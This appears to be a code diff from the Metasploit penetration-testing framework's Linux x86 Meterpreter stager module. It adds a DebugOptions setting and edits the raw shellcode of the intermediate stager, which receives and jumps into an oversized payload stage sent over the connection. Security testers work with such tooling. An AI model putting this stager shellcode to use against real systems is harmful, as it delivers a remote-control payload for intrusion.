@@ -29,7 +29,8 @@ module Metasploit3
 			'Session'       => Msf::Sessions::Meterpreter_x86_Linux))
 
 		register_options([
-			OptBool.new('PrependFork', [ false, "Add a fork() / exit_group() (for parent) code" ])
+			OptBool.new('PrependFork', [ false, "Add a fork() / exit_group() (for parent) code" ]),
+			OptInt.new('DebugOptions', [ false, "Debugging options for POSIX meterpreter", 0 ])
 		], self.class)
 	end
 
@@ -96,16 +97,21 @@ module Metasploit3
 			"\x04\x6a\x07\x5a\x6a\x32\x5e\x31\xff\x89\xfd\x4f\xcd\x80\x3d\x7f" +
 			"\xff\xff\xff\x72\x05\x31\xc0\x40\xcd\x80\x87\xd1\x87\xd9\x5b\x6a" +
 			"\x03\x58\xcd\x80\x3d\x7f\xff\xff\xff\x77\xea\x85\xc0\x74\xe6\x01" +
-			"\xc1\x29\xc2\x75\xea\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9\xd3\xff" +
-			"\xff\xff"
+			"\xc1\x29\xc2\x75\xea\x6a\x59\x53\xb8\x5a\x5a\x5a\x5a\xff\xd0\xe9" +
+			"\xd1\xff\xff\xff"
 
-		# Patch entry point in properly.
-		# Patch in base ?
+
+		# Patch in debug options
+		midstager = midstager.sub("Y", [ datastore['DebugOptions'] ].pack('C'))
+
+		# Patch entry point 
 		midstager = midstager.sub("ZZZZ", [ elf_ep(payload) ].pack('V'))
+
+		# Maybe in the future patch in base.
 
 		print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
 		conn.put(midstager)
-		Rex::ThreadSafe.sleep(3)
+		Rex::ThreadSafe.sleep(1.5)
 
 		# Send length of payload
 		conn.put([ payload.length ].pack('V'))
